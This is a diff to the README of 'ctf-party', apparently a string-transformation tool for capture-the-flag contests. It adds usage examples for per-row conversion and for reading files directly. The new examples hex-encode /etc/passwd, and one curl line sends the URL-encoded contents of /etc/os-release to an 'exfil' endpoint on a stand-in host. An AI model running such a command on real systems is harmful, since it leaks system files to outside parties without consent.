@@ -98,17 +98,17 @@ $ curl -s https://example.org | ctf-party - htmlescape
 It's possible to apply the transformation to each row instead of the whole string:
 
 ```
-$ seq 1 10 | ctf-party - to_b64 --row
-MQ==
-Mg==
-Mw==
-NA==
-NQ==
-Ng==
-Nw==
-OA==
-OQ==
-MTA=
+$ seq 1 10 | ctf-party - dec2hex hex2bin --row
+1
+10
+11
+100
+101
+110
+111
+1000
+1001
+1010
 
 $ curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Malware/conficker.txt | ctf-party - leet md5 --row
 dcddb75469b4b4875094e14561e573d8
@@ -131,6 +131,19 @@ aBcAbCaBcAbCaBcAbCaBd
 aBcAbCaBcAbCaBcAbCaBcAbD
 aBcAbCaBcAbCaBcAbCaBcAbCaBd
 aBcAbCaBcAbCaBcAbCaBcAbCaBcAbD
+```
+
+It's possible to read file directly:
+
+```
+$ ctf-party /etc/passwd str2hex --row --file
+726f6f743a783a303a303a3a2f726f6f743a2f62696e2f62617368
+62696e3a783a313a313a3a2f3a2f7362696e2f6e6f6c6f67696e
+6461656d6f6e3a783a323a323a3a2f3a2f7362696e2f6e6f6c6f67696e
+6d61696c3a783a383a31323a3a2f7661722f73706f6f6c2f6d61696c3a2f7362696e2f6e6f6c6f67696e
+...
+
+$ curl http://example.org/exfil?data=$(ctf-party /etc/os-release urlencode_component --file)
 ```
 
 ## Console
